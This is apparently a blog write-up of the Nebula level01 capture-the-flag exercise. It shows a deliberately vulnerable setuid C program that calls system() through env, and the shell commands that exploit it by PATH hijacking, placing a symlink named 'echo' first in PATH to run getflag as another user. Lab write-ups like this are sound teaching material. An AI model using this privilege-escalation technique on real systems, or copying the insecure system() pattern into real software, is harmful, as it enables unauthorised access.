+++
author = "pwntester"
categories = ["nebula01"]
date = 2013-11-20T09:18:00Z
description = ""
draft = false
slug = "nebula-level01-write-up"
tags = ["nebula01"]
title = "Nebula level01 write-up"

+++

<p>In <a href="http://exploit-exercises.com/nebula/level01">Level01</a> , we are given the following vulnerable c program:</p>

```lang-clike line-numbers 
#include <stdlib.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
 gid_t gid;
 uid_t uid;
 gid = getegid();
 uid = geteuid();

 setresgid(gid, gid, gid);
 setresuid(uid, uid, uid);

 system("/usr/bin/env echo and now what?");
}
```

<p>This is the code of the <strong>/home/flag01/flag01</strong> program that runs as flag01 user</p>

```lang-bash line-numbers 
level01@nebula:~$ ls -la /home/flag01/flag01
-rwsr-x--- 1 flag01 level01 7322 Nov 20  2011 /home/flag01/flag01
```

<p>As setresuid sets the Real, Effective and Saved uids to the effective one (flag01), the following call to <strong>system</strong> will effectively run as <strong>flag01</strong>. We just a need to run the <strong>getflag</strong> program instead. In order to do that, we will create a symbolic link to <strong>getflag</strong> in our home diretory and call it <strong>echo</strong>. Now we only need to modify the <strong>PATH</strong> environment variable.

```lang-bash line-numbers 
level01@nebula:~$ ln -s /bin/getflag echo
level01@nebula:~$ export PATH=/home/level01:$PATH
level01@nebula:~$ /home/flag01/flag01
You have successfully executed getflag on a target account
```
